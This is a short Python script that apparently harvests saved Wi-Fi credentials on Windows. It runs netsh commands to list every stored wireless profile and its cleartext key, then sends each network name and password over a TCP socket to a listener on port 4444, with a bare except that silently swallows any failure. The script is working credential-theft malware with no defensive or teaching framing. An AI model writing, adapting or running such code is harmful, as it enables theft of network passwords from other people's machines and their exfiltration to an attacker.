import socket
import subprocess


# Ip
HOST = 'localhost'
# Port
PORT = 4444

try:
    # Connect to ip
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # hook the password
    def main():
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    msg = ("SSID:{:<30}Password:{:<}".format(i, results[0]))
                    # send to server
                    s.send(bytes(msg, 'utf-8'))
                except IndexError:
                    print ("{:<30}|  {:<}".format(i, ""))
            except subprocess.CalledProcessError:
                print ("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
                s.send(bytes('error sending password', 'utf-8'))


    main()

except:
    pass

